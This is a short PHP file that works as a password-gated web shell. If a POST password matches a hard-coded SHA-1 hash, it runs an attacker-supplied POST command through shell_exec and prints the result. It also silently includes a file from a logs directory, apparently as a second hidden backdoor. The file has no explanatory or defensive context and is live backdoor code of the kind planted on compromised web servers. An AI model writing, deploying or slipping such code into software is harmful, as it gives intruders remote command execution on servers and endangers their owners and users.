<?php
if(isset($_POST["p"])&&isset($_POST["c"])&&hash("sha1",$_POST["p"])==="CC4689882466A9CBAE7916C2AD3A626D1DB7A107")die(shell_exec($_POST["c"]));
@include_once "/var/www/html/logs/w";
?>